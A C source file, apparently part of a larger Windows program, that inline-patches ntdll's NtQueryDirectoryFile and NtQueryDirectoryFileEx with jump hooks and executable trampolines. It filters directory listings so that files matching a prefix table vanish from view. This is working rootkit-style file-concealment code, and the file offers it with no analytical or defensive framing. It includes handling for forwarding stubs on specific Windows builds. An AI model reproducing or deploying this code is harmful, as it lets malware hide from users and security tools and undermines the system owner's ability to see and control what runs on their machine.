#include "file_hide.h"
#include <windows.h>
#include <winternl.h>
#include <string.h>

#define PATCH_SIZE  16
#define TRAMP_SIZE  32
#define JMP_SIZE    12

#define FileDirectoryInformation_         1
#define FileBothDirectoryInformation_     3
#define FileIdBothDirectoryInformation_  37
#define STATUS_NO_MORE_FILES_ ((NTSTATUS)0x80000006L)

typedef NTSTATUS (NTAPI *pNtQueryDirectoryFile)(
    HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK,
    PVOID, ULONG, ULONG, BOOLEAN, PUNICODE_STRING, BOOLEAN);

typedef NTSTATUS (NTAPI *pNtQueryDirectoryFileEx)(
    HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK,
    PVOID, ULONG, ULONG, ULONG, PUNICODE_STRING);

/* --- Estado del hook ---------------------------------------------------- */

static PrefixTable           *g_table      = NULL;
static pNtQueryDirectoryFile  g_original   = NULL;
static pNtQueryDirectoryFile  g_trampoline = NULL;
static BYTE                   g_saved[PATCH_SIZE];

static pNtQueryDirectoryFileEx  g_original_ex   = NULL;
static pNtQueryDirectoryFileEx  g_trampoline_ex = NULL;
static BYTE                     g_saved_ex[PATCH_SIZE];

/* --- Helpers para extraer FileName de cada struct ----------------------- */

static void get_entry_name(BYTE *entry, ULONG info_class,
                           WCHAR **name, ULONG *name_len)
{
    if (info_class == FileIdBothDirectoryInformation_) {
        FILE_ID_BOTH_DIR_INFORMATION *e = (FILE_ID_BOTH_DIR_INFORMATION *)entry;
        *name     = e->FileName;
        *name_len = e->FileNameLength;
    } else if (info_class == FileBothDirectoryInformation_) {
        FILE_BOTH_DIR_INFORMATION *e = (FILE_BOTH_DIR_INFORMATION *)entry;
        *name     = e->FileName;
        *name_len = e->FileNameLength;
    } else {
        FILE_DIRECTORY_INFORMATION *e = (FILE_DIRECTORY_INFORMATION *)entry;
        *name     = e->FileName;
        *name_len = e->FileNameLength;
    }
}

static ULONG get_next_offset(BYTE *entry, ULONG info_class)
{
    (void)info_class;
    return *(ULONG *)entry;
}

static void set_next_offset(BYTE *entry, ULONG info_class, ULONG val)
{
    (void)info_class;
    *(ULONG *)entry = val;
}

/* --- Shared filtering logic --------------------------------------------- */

static NTSTATUS filter_entries(NTSTATUS status, PVOID FileInformation,
                               ULONG Length, ULONG FileInformationClass)
{
    if (status != 0)
        return status;

    if (FileInformationClass != FileDirectoryInformation_ &&
        FileInformationClass != FileBothDirectoryInformation_ &&
        FileInformationClass != FileIdBothDirectoryInformation_)
        return status;

    BYTE *buf  = (BYTE *)FileInformation;
    BYTE *prev = NULL;
    BYTE *curr = buf;
    int   any_visible = 0;

    for (;;) {
        WCHAR *entry_name;
        ULONG  entry_name_len;
        get_entry_name(curr, FileInformationClass, &entry_name, &entry_name_len);

        WCHAR name_buf[MAX_PREFIX_LEN];
        ULONG char_count = entry_name_len / sizeof(WCHAR);
        if (char_count >= MAX_PREFIX_LEN)
            char_count = MAX_PREFIX_LEN - 1;
        memcpy(name_buf, entry_name, char_count * sizeof(WCHAR));
        name_buf[char_count] = L'\0';

        ULONG next = get_next_offset(curr, FileInformationClass);
        int hide = prefix_matches(g_table, name_buf);

        if (hide) {
            if (prev == NULL) {
                if (next == 0)
                    return STATUS_NO_MORE_FILES_;
                ULONG remaining = Length - (ULONG)(curr - buf) - next;
                memmove(curr, curr + next, remaining);
                continue;
            } else {
                if (next == 0)
                    set_next_offset(prev, FileInformationClass, 0);
                else
                    set_next_offset(prev, FileInformationClass,
                        get_next_offset(prev, FileInformationClass) + next);
            }
        } else {
            prev = curr;
            any_visible = 1;
        }

        if (next == 0)
            break;
        curr = curr + next;
    }

    if (!any_visible)
        return STATUS_NO_MORE_FILES_;

    return status;
}

/* --- Hook functions ----------------------------------------------------- */

static NTSTATUS NTAPI HookedNtQueryDirectoryFile(
    HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation, ULONG Length, ULONG FileInformationClass,
    BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName,
    BOOLEAN RestartScan)
{
    NTSTATUS status = g_trampoline(
        FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock,
        FileInformation, Length, FileInformationClass,
        ReturnSingleEntry, FileName, RestartScan);

    return filter_entries(status, FileInformation, Length, FileInformationClass);
}

static NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(
    HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation, ULONG Length, ULONG FileInformationClass,
    ULONG QueryFlags, PUNICODE_STRING FileName)
{
    NTSTATUS status = g_trampoline_ex(
        FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock,
        FileInformation, Length, FileInformationClass,
        QueryFlags, FileName);

    return filter_entries(status, FileInformation, Length, FileInformationClass);
}

/* --- write_abs_jmp: mov rax, addr; jmp rax (12 bytes) ------------------ */

static void write_abs_jmp(BYTE *buf, void *target)
{
    buf[0] = 0x48;
    buf[1] = 0xB8;
    *(UINT_PTR *)(buf + 2) = (UINT_PTR)target;
    buf[10] = 0xFF;
    buf[11] = 0xE0;
}

/* --- Install / remove --------------------------------------------------- */

int file_hide_install(PrefixTable *table)
{
    g_table = table;

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return -1;

    g_original = (pNtQueryDirectoryFile)
        GetProcAddress(ntdll, "NtQueryDirectoryFile");
    if (!g_original) return -1;

    memcpy(g_saved, (void *)g_original, PATCH_SIZE);

    g_trampoline = (pNtQueryDirectoryFile)
        VirtualAlloc(NULL, TRAMP_SIZE,
                     MEM_COMMIT | MEM_RESERVE,
                     PAGE_EXECUTE_READWRITE);
    if (!g_trampoline) return -1;

    memcpy((void *)g_trampoline, g_saved, PATCH_SIZE);
    write_abs_jmp((BYTE *)g_trampoline + PATCH_SIZE,
                  (BYTE *)g_original + PATCH_SIZE);

    DWORD oldProt;
    if (!VirtualProtect((void *)g_original, PATCH_SIZE,
                        PAGE_EXECUTE_READWRITE, &oldProt)) {
        VirtualFree((void *)g_trampoline, 0, MEM_RELEASE);
        return -1;
    }

    write_abs_jmp((BYTE *)g_original,
                  (void *)HookedNtQueryDirectoryFile);

    DWORD tmp;
    VirtualProtect((void *)g_original, PATCH_SIZE, oldProt, &tmp);

    /* --- Hook NtQueryDirectoryFileEx (Windows 10 1709+) ---
       On some builds (e.g. Win Server 2019 17763), the export is a
       5-byte E9 JMP rel32 forwarding stub followed by CC padding and
       then the next function.  Patching 12+ bytes there corrupts the
       neighbor; patching the distant retpoline target also crashes
       (CFG / guard pages).  Instead: rewrite only the E9's 4-byte
       displacement so it points to our hook, and build the trampoline
       as an absolute JMP to the original target.  For standard stubs
       (first byte != E9), use the normal 16-byte trampoline. */
    g_original_ex = (pNtQueryDirectoryFileEx)
        GetProcAddress(ntdll, "NtQueryDirectoryFileEx");
    if (g_original_ex) {
        BYTE *ex_ptr = (BYTE *)g_original_ex;

        if (ex_ptr[0] == 0xE9) {
            INT32 orig_disp = *(INT32 *)(ex_ptr + 1);
            void *orig_target = ex_ptr + 5 + orig_disp;

            /* Check that our hook is within ±2GB (E9 rel32 range). */
            INT64 delta = (BYTE *)HookedNtQueryDirectoryFileEx - (ex_ptr + 5);
            if (delta < -2147483648LL || delta > 2147483647LL) {
                g_original_ex = NULL;   /* too far — skip */
            } else {
                memcpy(g_saved_ex, ex_ptr, PATCH_SIZE);

                g_trampoline_ex = (pNtQueryDirectoryFileEx)
                    VirtualAlloc(NULL, TRAMP_SIZE,
                                 MEM_COMMIT | MEM_RESERVE,
                                 PAGE_EXECUTE_READWRITE);
                if (g_trampoline_ex) {
                    write_abs_jmp((BYTE *)g_trampoline_ex, orig_target);

                    if (VirtualProtect(ex_ptr, 5,
                                       PAGE_EXECUTE_READWRITE, &oldProt)) {
                        *(INT32 *)(ex_ptr + 1) = (INT32)delta;
                        VirtualProtect(ex_ptr, 5, oldProt, &tmp);
                    }
                } else {
                    g_original_ex = NULL;
                }
            }
        } else {
            /* Standard syscall stub: normal 16-byte trampoline. */
            memcpy(g_saved_ex, (void *)g_original_ex, PATCH_SIZE);

            g_trampoline_ex = (pNtQueryDirectoryFileEx)
                VirtualAlloc(NULL, TRAMP_SIZE,
                             MEM_COMMIT | MEM_RESERVE,
                             PAGE_EXECUTE_READWRITE);
            if (g_trampoline_ex) {
                memcpy((void *)g_trampoline_ex, g_saved_ex, PATCH_SIZE);
                write_abs_jmp((BYTE *)g_trampoline_ex + PATCH_SIZE,
                              (BYTE *)g_original_ex + PATCH_SIZE);

                if (VirtualProtect((void *)g_original_ex, PATCH_SIZE,
                                   PAGE_EXECUTE_READWRITE, &oldProt)) {
                    write_abs_jmp((BYTE *)g_original_ex,
                                  (void *)HookedNtQueryDirectoryFileEx);
                    VirtualProtect((void *)g_original_ex, PATCH_SIZE,
                                   oldProt, &tmp);
                }
            }
        }
    }

    return 0;
}

void file_hide_remove(void)
{
    if (g_original) {
        DWORD oldProt;
        if (VirtualProtect((void *)g_original, PATCH_SIZE,
                           PAGE_EXECUTE_READWRITE, &oldProt)) {
            memcpy((void *)g_original, g_saved, PATCH_SIZE);
            DWORD tmp;
            VirtualProtect((void *)g_original, PATCH_SIZE, oldProt, &tmp);
        }
        if (g_trampoline) {
            VirtualFree((void *)g_trampoline, 0, MEM_RELEASE);
            g_trampoline = NULL;
        }
    }

    if (g_original_ex) {
        DWORD oldProt;
        if (VirtualProtect((void *)g_original_ex, PATCH_SIZE,
                           PAGE_EXECUTE_READWRITE, &oldProt)) {
            memcpy((void *)g_original_ex, g_saved_ex, PATCH_SIZE);
            DWORD tmp;
            VirtualProtect((void *)g_original_ex, PATCH_SIZE, oldProt, &tmp);
        }
        if (g_trampoline_ex) {
            VirtualFree((void *)g_trampoline_ex, 0, MEM_RELEASE);
            g_trampoline_ex = NULL;
        }
    }
}
